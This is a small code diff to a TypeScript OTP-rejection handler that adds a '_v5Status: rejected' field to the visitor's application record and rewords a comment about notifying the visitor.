@@ -87,8 +87,9 @@ export async function handleOtpRejection(
   // Update history status
   await updateHistoryStatus(visitorId, historyId, "rejected", history)
   
-  // Clear OTP and reopen dialog
+  // Reject OTP and notify visitor
   await updateApplication(visitorId, {
+    _v5Status: "rejected",
     otpCode: "",
     otpStatus: "show_otp" as any
   })
